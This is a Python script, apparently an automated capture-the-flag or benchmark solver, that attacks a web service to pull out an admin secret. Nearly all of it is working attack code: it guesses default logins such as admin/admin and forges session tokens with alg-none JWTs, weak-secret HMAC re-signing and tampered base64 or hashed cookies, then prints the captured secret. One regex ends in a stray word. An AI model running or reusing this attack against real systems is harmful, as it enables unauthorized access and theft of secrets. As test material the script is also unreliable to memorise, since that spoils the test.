import sys, json, base64, re, hashlib, hmac
prov={}
try:
 if len(sys.argv)>1:
  prov=json.loads(sys.argv[1])
except: pass
def req(method, path, headers=None, body=None, body_hex=None):
 try:
  o={"http":{"method":method,"path":path}}
  if headers: o["http"]["headers"]=headers
  if body is not None: o["http"]["body"]=body
  if body_hex is not None: o["http"]["body_hex"]=body_hex
  print(json.dumps(o),flush=True)
  line=sys.stdin.readline()
  if not line: return None,b"", ""
  r=json.loads(line)
  bd=b""
  try:
   bd=base64.b64decode(r.get("body_b64",""))
  except: bd=b""
  return r.get("status"),bd,r
 except Exception as e:
  return None,b"",{}
def txt(b):
 try: return b.decode(errors="replace")
 except: return ""
def jload(b):
 try: return json.loads(b.decode())
 except: return None
def extract_secret(b):
 t=txt(b)
 # json keys
 j=jload(b)
 if isinstance(j,dict):
  for k in ["secret_hex","secret","flag","SECRET","admin_secret","key","token"]:
   if k in j and isinstance(j[k],str):
    v=j[k].strip()
    # if hex-like return it
    if re.fullmatch(r"[0-9a-fA-F]+ Strat",v): pass
    if re.fullmatch(r"[0-9a-fA-F]{16,}",v): return v.lower()
    m=re.search(r"[0-9a-fA-F]{32,}",v)
    if m: return m.group(0).lower()
    if len(v)>=8 and re.fullmatch(r"[0-9a-fA-F]+",v): return v.lower()
  # nested
  s=json.dumps(j)
  m=re.search(r"[0-9a-fA-F]{32,}",s)
  if m and ("secret" in s.lower() or "flag" in s.lower()): return m.group(0).lower()
 # flag{...}
 m=re.search(r"flag\{[^}]+\}",t)
 if m: return m.group(0).encode().hex()
 # long hex in text near secret keyword
 if "secret" in t.lower() or "admin" in t.lower() or "flag" in t.lower():
  m=re.findall(r"[0-9a-fA-F]{16,}",t)
  if m:
   # prefer longest
   m.sort(key=len,reverse=True)
   return m[0].lower()
 # any 32+ hex
 m=re.findall(r"[0-9a-fA-F]{32,}",t)
 if m:
  m.sort(key=len,reverse=True)
  # avoid obvious hashes of page (e.g., css) - but return longest anyway as candidate
  return m[0].lower()
 return None
def is_success(status,body):
 if status!=200: return False
 t=txt(body).lower()
 if "unauthor" in t or "forbidden" in t or "access denied" in t or "login required" in t or "not admin" in t:
  # unless also contains secret
  if "secret" not in t and "flag" not in t: return False
 return True
candidates=[]
# Phase 1: discovery GETs
get_paths=["/","/login","/admin","/secret","/api/secret","/api/admin","/flag","/robots.txt","/source","/app.py","/help","/api/help","/api/login","/signin","/register","/api/register","/status","/health","/admin/","/admin/secret","/user","/api/user","/me","/api/me"]
bodies={}
for p in get_paths:
 s,b,r=req("GET",p)
 if s is None: break
 bodies[p]=(s,b,r)
 sec=extract_secret(b)
 if sec and is_success(s,b):
  candidates.append(("direct "+p,sec,s,b))
# try to find login form hints from root
root_txt=""
if "/" in bodies: root_txt=txt(bodies["/"][1])
# Phase 2: try logins
login_paths=["/login","/api/login","/signin","/api/signin","/auth","/auth/login","/session","/api/session","/register","/api/register"]
cred_list=[("admin","admin"),("admin","password"),("admin","letmein"),("admin","1234"),("guest","guest"),("user","user"),("test","test"),("admin",""),("guest",""),("user","password")]
observed_tokens=[]
# also try GET login with query
for lp in login_paths:
 for u,pw in cred_list[:4]:
  # POST JSON
  s,b,r=req("POST",lp,headers={"Content-Type":"application/json"},body=json.dumps({"username":u,"password":pw}))
  if s is None: break
  sec=extract_secret(b)
  if sec and is_success(s,b): candidates.append(("loginpost "+lp+u,sec,s,b))
  # check for token in body
  j=jload(b)
  if isinstance(j,dict):
   for k in list(j.keys()):
    lk=k.lower()
    if "token" in lk or "session" in lk or "auth" in lk or "cookie" in lk or "secret" in lk or k.lower()=="sid":
     v=j[k]
     if isinstance(v,str) and len(v)>1:
      observed_tokens.append((lp+" json:"+k,v,b))
  t=txt(b)
  # look for token=... session=... patterns
  for m in re.finditer(r"(?:token|session|sid|auth)[\"'\s:=]+([A-Za-z0-9_\-\.\+\/\=]{4,300})",t,re.I):
   observed_tokens.append((lp+" regex",m.group(1),b))
  if s==200 and ("token" in t.lower() or "session" in t.lower()):
   pass
  # only try first login path extensively, others lightly to save budget
  break
 # only full cred sweep on /login and /api/login
 if lp not in ("/login","/api/login"):
  continue
 for u,pw in cred_list[4:]:
  s,b,r=req("POST",lp,headers={"Content-Type":"application/json"},body=json.dumps({"username":u,"password":pw}))
  if s is None: break
  j=jload(b)
  if isinstance(j,dict):
   for k in list(j.keys()):
    if "token" in k.lower() or "session" in k.lower():
     v=j[k]
     if isinstance(v,str): observed_tokens.append((lp+" json2:"+k,v,b))
# try form-encoded login
for lp in ["/login","/api/login"]:
 for u,pw in [("admin","admin"),("guest","guest")]:
  s,b,r=req("POST",lp,headers={"Content-Type":"application/x-www-form-urlencoded"},body=f"username={u}&password={pw}")
  if s is None: break
  j=jload(b)
  if isinstance(j,dict):
   for k in list(j.keys()):
    if "token" in k.lower() or "session" in k.lower():
     v=j[k]
     if isinstance(v,str): observed_tokens.append((lp+" form:"+k,v,b))
# try register then login
for rp in ["/register","/api/register"]:
 s,b,r=req("POST",rp,headers={"Content-Type":"application/json"},body=json.dumps({"username":"testuser123","password":"testpass123"}))
 if s is None: break
 j=jload(b)
 if isinstance(j,dict):
  for k in list(j.keys()):
   if "token" in k.lower() or "session" in k.lower():
    v=j[k]
    if isinstance(v,str): observed_tokens.append((rp+" reg:"+k,v,b))
# Phase 2b: try to get token via GET /login?user= etc
for p in ["/login?username=guest&password=guest","/api/login?username=guest&password=guest","/session/new","/api/session/new","/token","/api/token"]:
 s,b,r=req("GET",p)
 if s is None: break
 j=jload(b)
 if isinstance(j,dict):
  for k in list(j.keys()):
   if "token" in k.lower() or "session" in k.lower():
    v=j[k]
    if isinstance(v,str): observed_tokens.append((p+" get:"+k,v,b))
# dedupe tokens
seen=set()
uniq=[]
for src,v,bb in observed_tokens:
 if v not in seen:
  seen.add(v); uniq.append((src,v))
observed_tokens=uniq
# helper to try admin with cookie variants
admin_paths=["/admin","/admin/","/secret","/api/secret","/api/admin","/api/admin/secret","/flag","/api/flag","/"]
cookie_names=["session","session_id","sid","token","auth","auth_token","sess","user_session","SESSION","Token"]
# collect forged token strings to try
forge_strings=set()
# add observed tokens themselves (maybe guest token already admin? or need tweak)
for _,v in observed_tokens:
 forge_strings.add(v)
# predictable basics
for s0 in ["admin","administrator","root","0","1","2","admin:1","admin:true","true","1|admin","admin|admin"]:
 forge_strings.add(s0)
import base64 as B64
def b64e(s): return B64.b64encode(s.encode()).decode()
for s0 in ["admin","{\"user\":\"admin\"}","{\"username\":\"admin\",\"role\":\"admin\"}","{\"user\":\"admin\",\"role\":\"admin\"}","{\"username\":\"admin\",\"admin\":true}"]:
 forge_strings.add(s0); forge_strings.add(b64e(s0)); forge_strings.add(B64.urlsafe_b64encode(s0.encode()).decode().rstrip("="))
for h in [hashlib.md5(b"admin").hexdigest(),hashlib.sha1(b"admin").hexdigest(),hashlib.sha256(b"admin").hexdigest(),hashlib.md5(b"0").hexdigest(),hashlib.md5(b"1").hexdigest()]:
 forge_strings.add(h)
# JWT none forgery helper
def b64u(data): return B64.urlsafe_b64encode(data).decode().rstrip("=")
for payload in [{"user":"admin"},{"username":"admin"},{"sub":"admin"},{"user":"admin","role":"admin"},{"username":"admin","role":"admin"},{"admin":True},{"is_admin":True}]:
 hdr=b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
 pl=b64u(json.dumps(payload).encode())
 forge_strings.add(f"{hdr}.{pl}.")
 forge_strings.add(f"{hdr}.{pl}")
# if observed tokens look structured, generate targeted forgeries
def add_hash_variants(data_str):
 for fn in [hashlib.md5,hashlib.sha1,hashlib.sha256]:
  try: forge_strings.add(fn(data_str.encode()).hexdigest())
  except: pass
  try: forge_strings.add(fn(B64.b64encode(data_str.encode())).hexdigest())
  except: pass
for src,v in observed_tokens:
 v=v.strip()
 # JWT?
 if v.count(".")==2:
  parts=v.split(".")
  try:
   pad=lambda s: s+"="*(-len(s)%4)
   hdrj=json.loads(B64.urlsafe_b64decode(pad(parts[0])).decode(errors="replace"))
   plj=json.loads(B64.urlsafe_b64decode(pad(parts[1])).decode(errors="replace"))
   # forge admin payloads
   for admin_key in ["admin","administrator","root"]:
    for pk in ["user","username","sub","login","uid","id"]:
     np=dict(plj); np[pk]=admin_key
     if "role" in plj: np["role"]="admin"
     if "admin" in plj: np["admin"]=True
     forge_strings.add(f"{b64u(json.dumps(hdrj).encode())}.{b64u(json.dumps(np).encode())}.{parts[2]}")
     # none alg
     forge_strings.add(f"{b64u(json.dumps({'alg':'none'}).encode())}.{b64u(json.dumps(np).encode())}.")
    np2=dict(plj); np2["role"]="admin"; np2["is_admin"]=True; np2["admin"]=True
    forge_strings.add(f"{b64u(json.dumps(hdrj).encode())}.{b64u(json.dumps(np2).encode())}.{parts[2]}")
    forge_strings.add(f"{b64u(json.dumps({'alg':'none'}).encode())}.{b64u(json.dumps(np2).encode())}.")
   # try weak secret crack: signature = HMAC(secret, hdr.pl) or hash?
   # will attempt weak secrets later in targeted phase
  except Exception: pass
 # base64 json?
 try:
  pad=lambda s: s+"="*(-len(s)%4)
  dec=B64.b64decode(pad(v)).decode()
  dj=json.loads(dec)
  if isinstance(dj,dict):
   for ak in ["admin","administrator"]:
    nd=dict(dj); 
    for pk in ["user","username","sub","login"]:
     if pk in nd: nd[pk]=ak
    nd["role"]="admin"; nd["admin"]=True; nd["is_admin"]=True
    forge_strings.add(B64.b64encode(json.dumps(nd).encode()).decode())
    forge_strings.add(B64.urlsafe_b64encode(json.dumps(nd).encode()).decode().rstrip("="))
 except Exception: pass
 # data|sig or data.sig or data:sig
 for sep in [".","|",":","-","_"]:
  if sep in v:
   d,sig=v.rsplit(sep,1)
   if 8<=len(sig)<=128 and re.fullmatch(r"[0-9a-fA-F]+",sig):
    # check if sig == hash(d) unsalted
    for fn,name in [(hashlib.md5,"md5"),(hashlib.sha1,"sha1"),(hashlib.sha256,"sha256")]:
     if fn(d.encode()).hexdigest().lower()==sig.lower():
      # forge admin
      for adm in ["admin","administrator","root","0","1"]:
       forge_strings.add(adm+sep+fn(adm.encode()).hexdigest())
       # also try d with admin substitution? try replacing user part
       # try base64 variants
       forge_strings.add(B64.b64encode(adm.encode()).decode()+sep+fn(B64.b64encode(adm.encode()).hexdigest() if False else B64.b64encode(adm.encode()).decode().encode()).hexdigest() if False else fn(B64.b64encode(adm.encode()).decode().encode()).hexdigest())
     # hmac with empty/weak? handled later
    add_hash_variants(d)
    # try admin data with same sig length: recompute with md5/sha
    for adm in ["admin","administrator","root","guest","testuser123"]:
     for fn in [hashlib.md5,hashlib.sha1,hashlib.sha256]:
      forge_strings.add(adm+sep+fn(adm.encode()).hexdigest())
    # also try keeping sig but changing data (in case check only compares derived value of sig?)
    for adm in ["admin","administrator"]:
     forge_strings.add(adm+sep+sig)
# also if observed token is plain (e.g., "guest" or numeric), try admin equivalents
for src,v in observed_tokens:
 if re.fullmatch(r"\d+",v.strip()):
  for i in ["0","1","2","1000","999"]: forge_strings.add(i)
 if v.strip().lower() in ("guest","user","test","testuser123","anonymous"):
  for a in ["admin","administrator","root"]: forge_strings.add(a)
# Phase 3: try admin accesses
# First try without any token (maybe open)
found=None
for ap in admin_paths:
 s,b,r=req("GET",ap)
 if s is None: break
 sec=extract_secret(b)
 if sec and is_success(s,b):
  # verify it looks like real secret (avoid false positive from login page hashes)
  # require secret keyword nearby or json
  t=txt(b).lower()
  if "secret" in t or "flag" in t or isinstance(jload(b),dict):
   found=sec; break
if found is None:
 # try cookie variants
 forge_list=list(forge_strings)[:120]
 # also add weak-secret JWT crack if we saw JWT
 weak_secrets=["secret","password","123456","admin","key","jwt_secret","supersecret","changeme","qwerty","letmein","","test"]
 # Build JWT signed with weak secrets for admin payloads
 jwt_extra=[]
 for src,v in observed_tokens:
  if v.count(".")==2:
   parts=v.split(".")
   signing_input=f"{parts[0]}.{parts[1]}"
   # try to decode payload to reuse, else use admin payload
   try:
    pad=lambda s: s+"="*(-len(s)%4)
    plj=json.loads(B64.urlsafe_b64decode(pad(parts[1])).decode())
   except: plj={"user":"admin","role":"admin"}
   for ws in weak_secrets:
    for alg in ["HS256","HS512","HS384"]:
     for digestmod in [hashlib.sha256,hashlib.sha512,hashlib.sha384]:
      try:
       sig=B64.urlsafe_b64encode(hmac.new(ws.encode(),signing_input.encode(),digestmod).digest()).decode().rstrip("=")
       jwt_extra.append(f"{signing_input}.{sig}")
      except: pass
     break
    break
  break
 forge_list.extend(jwt_extra[:20])
 for tok in forge_list:
  # try multiple cookie names + bearer + query
  attempts=[]
  for cn in cookie_names[:6]:
   attempts.append(("cookie",{ "Cookie": f"{cn}={tok}" }))
  attempts.append(("bearer",{ "Authorization": f"Bearer {tok}" }))
  attempts.append(("xheader",{ "X-Session": tok, "X-User": "admin", "X-Role": "admin" }))
  for kind,hdrs in attempts:
   for ap in ["/admin","/secret","/api/secret","/api/admin"]:
    s,b,r=req("GET",ap,headers=hdrs)
    if s is None: break
    sec=extract_secret(b)
    if sec and is_success(s,b):
     t=txt(b).lower()
     if "secret" in t or "flag" in t or isinstance(jload(b),dict):
      found=sec; break
   if found: break
   # query param try (only once per tok to save budget)
  if found: break
  if forge_list.index(tok)%10==0:
   # periodic query-param attempt
   for ap in ["/admin","/secret"]:
    s,b,r=req("GET",f"{ap}?session={tok[:200]}&user=admin")
    if s is None: break
    sec=extract_secret(b)
    if sec and is_success(s,b):
     t=txt(b).lower()
     if "secret" in t or "flag" in t:
      found=sec; break
  if found: break
  if forge_list.index(tok)>60: break
if found is None:
 # last resort: try POST /admin with admin params and header combos
 for tok in list(forge_strings)[:20]:
  for ap in ["/admin","/api/admin"]:
   s,b,r=req("POST",ap,headers={"Content-Type":"application/json","Cookie":f"session={tok}"},body=json.dumps({"user":"admin","role":"admin"}))
   if s is None: break
   sec=extract_secret(b)
   if sec and is_success(s,b):
    t=txt(b).lower()
    if "secret" in t or "flag" in t:
     found=sec; break
  if found: break
# fallback: use any candidate seen earlier
if found is None and candidates:
 found=candidates[0][1]
if found is None:
 found="00"
# normalize to hex (if flag{...} case, hex-encode handled above; if not hex, hex-encode raw?)
if not re.fullmatch(r"[0-9a-fA-F]+",found):
 found=found.encode().hex()
print(f"CLAIM:{json.dumps({'secret_hex':found.lower()})}",flush=True)